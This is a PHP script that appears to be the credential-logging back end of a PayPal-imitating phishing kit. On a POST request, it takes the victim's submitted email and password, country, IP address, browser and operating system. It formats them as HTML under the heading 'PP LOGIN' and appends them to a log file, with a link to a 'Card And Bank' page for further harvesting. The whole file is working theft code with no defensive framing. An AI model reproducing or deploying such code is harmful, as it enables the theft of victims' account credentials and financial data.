<?
if (! ($_SERVER['REQUEST_METHOD'] === 'POST')) {
     exit;
}
$date = $_POST['date'];
$_SESSION = $_POST['s'];
$Z118_MESSAGE .= "

<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>

  <font style='color: rgb(251, 58, 105);'>PP LOGIN :</font>
  <font style='color: rgb(20, 158, 27);'>Add New Accuont:</font> $date       
                                                                   
   <font style='color: rgb(128, 129, 131);'>&#10112; PP Email   :</font>  <font style='color: rgb(235, 79, 60);'> ".$_POST['login_email']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; PP Password :</font>  <font style='color: rgb(60, 118, 235);'> ".$_POST['login_password']."</font>
   <font style='color: rgb(128, 129, 131);'>&#10112; Country Name  :</font>  <font style='color: rgb(65, 66, 68);'> 
".$_SESSION['COUNTRY']."</font>
   
   <font style='color: rgb(128, 129, 131);'>&#10112; More   :</font>  <font style='color: rgb(60, 118, 235);'> <a href = './sc2/tnt2.html'>Card And Bank</a></font>
   <font style='color: rgb(128, 129, 131);'>&#10114; IP          :</font>  <font style='color: rgb(60, 118, 235);'><a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$_POST['REMOTE_ADDR']."'>".$_POST['REMOTE_ADDR']."</a></font> 
   <font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_POST['b']." On ".$_POST['os']."</font>
   ";
   
   $f = fopen("tnt1.html", "a");
	    fwrite($f, $Z118_MESSAGE);


fclose($f);
   
   
   echo 'success';


?>